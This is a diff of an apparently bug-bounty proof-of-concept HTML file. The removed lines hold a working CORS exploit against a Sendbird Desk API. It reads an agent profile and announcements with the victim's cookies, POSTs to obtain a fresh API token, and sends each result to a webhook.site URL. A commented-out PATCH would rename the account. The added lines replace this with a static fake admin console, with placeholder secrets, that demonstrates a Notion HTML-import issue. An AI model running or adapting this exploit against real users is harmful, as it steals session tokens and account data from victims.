@@ -1,51 +1,81 @@
-<!-- save as desk-cors-poc.html and push to GitHub Pages -->
 <!doctype html>
-<meta charset="utf-8">
-<title>Sendbird Desk CORS exploit</title>
-<script>
-const WEBHOOK_URL = '	https://webhook.site/965c52a8-a7cc-49dd-bf8b-dcdb58a0b70f'; // ← change me once
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Internal Admin – Service Console</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    :root { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; }
+    body { margin: 0; background:#0b1020; color:#e9eef5; }
+    header { padding: 24px; background:#0e1730; border-bottom:1px solid #1a2545; }
+    h1 { margin:0 0 6px 0; font-size: 20px; letter-spacing: .3px; }
+    .sub { opacity:.7; font-size:13px }
+    main { padding: 28px; max-width: 920px; }
+    .card { background:#101a36; border:1px solid #1a2545; border-radius:12px; padding:18px; margin-bottom:16px; }
+    .kvs { width:100%; border-collapse: collapse; font-size:14px; }
+    .kvs th, .kvs td { border-bottom:1px solid #1a2545; padding:10px 8px; text-align:left; }
+    .kvs th { opacity:.8; font-weight:600; }
+    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }
+    pre { background:#0e1730; border:1px solid #1a2545; border-radius:10px; padding:12px; overflow:auto; }
+    .pill { display:inline-block; padding:2px 8px; border-radius:999px; background:#1e2b52; border:1px solid #2b3c6f; font-size:12px; }
+    .row { display:flex; gap:16px; flex-wrap:wrap; }
+    .row .card { flex:1 1 280px; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Internal Admin – Service Console</h1>
+    <div class="sub">environment=<span class="pill">prod-us-west-2</span> &nbsp; build=<span class="pill">2025.08.08-1421</span></div>
+  </header>
 
-/* helper: fire-and-forget exfil – 'no-cors' so browser skips CORS checks */
-const pwn = (tag, data) =>
-  fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: tag + ':' + data });
+  <main>
+    <section class="row">
+      <div class="card">
+        <h2>Instance</h2>
+        <table class="kvs">
+          <tr><th>Hostname</th><td>ip-10-2-34-17</td></tr>
+          <tr><th>AZ</th><td>us-west-2a</td></tr>
+          <tr><th>Role</th><td>svc-importer-prod</td></tr>
+          <tr><th>Commit</th><td>c9a7e12</td></tr>
+        </table>
+      </div>
 
-(async () => {
-  /* 1️⃣  READ: agent profile */
-  const agent = await fetch(
-      'https://desk-api-us-3.sendbird.com/api/agents/27405',
-      { credentials: 'include', headers: { Accept: 'application/json' } }
-  ).then(r => r.text());
-  await pwn('AGENT', agent);
+      <div class="card">
+        <h2>Service Health</h2>
+        <table class="kvs">
+          <tr><th>Status</th><td><span class="pill">OK</span></td></tr>
+          <tr><th>Uptime</th><td>14d 03h</td></tr>
+          <tr><th>Requests (24h)</th><td>3,142,220</td></tr>
+        </table>
+      </div>
+    </section>
 
-  /* 2️⃣  READ: announcements (proves SameSite=None cookie rides along) */
-  const ann = await fetch(
-      'https://desk-api-us-3.sendbird.com/api/announcements/agent',
-      { credentials: 'include' }
-  ).then(r => r.text());
-  await pwn('ANNOUNCE', ann);
+    <section class="card">
+      <h2>Recent Config</h2>
+      <pre>{
+  "import_html": { "enabled": true, "max_size": "2 MB", "follow_redirects": false },
+  "network": { "allow_private_ranges": false, "egress_vpc": "vpc-0abc123" },
+  "logging": { "redact_tokens": true }
+}</pre>
+    </section>
 
-  /* 3️⃣  POST: steal a fresh Desk API token  --------------------------- */
-  /*  The endpoint allows POST with content-type JSON, creds included. */
-  const token = await fetch(
-      'https://desk-api-us-3.sendbird.com/api/auth/token',
-      { method: 'POST',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' },
-        body: '{}' }                   // body is irrelevant; empty JSON accepted
-  ).then(r => r.text());
-  await pwn('TOKEN', token);
+    <section class="card">
+      <h2>Example Secrets (redacted)</h2>
+      <pre>{
+  "aws_role": "arn:aws:iam::123456789012:role/svc-importer-prod",
+  "sts_credentials": {
+    "AccessKeyId": "AKIA****************",
+    "SecretAccessKey": "********************",
+    "SessionToken": "****"
+  }
+}</pre>
+    </section>
 
-  /* 4️⃣  OPTIONAL WRITE: rename myself (needs PATCH allowed) ----------- */
-  /*  Uncomment to demo integrity impact. */
-  /*
-  await fetch(
-      'https://desk-api-us-3.sendbird.com/api/agents/27405',
-      { method: 'PATCH',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' },
-        body: '{"displayName":"pwned-'+Date.now()+'"}' });
-  */
-
-  document.body.textContent = '✓ exploit finished – check Webhook.site';
-})();
-</script>
+    <section class="card">
+      <h2>Notes</h2>
+      <p>This is a static demo page to prove that the Notion HTML importer fetches and inlines arbitrary <strong>HTML</strong> from a URL you control.</p>
+      <p>When imported, all of the above should appear directly inside the Notion page without the recipient contacting this origin.</p>
+    </section>
+  </main>
+</body>
+</html>
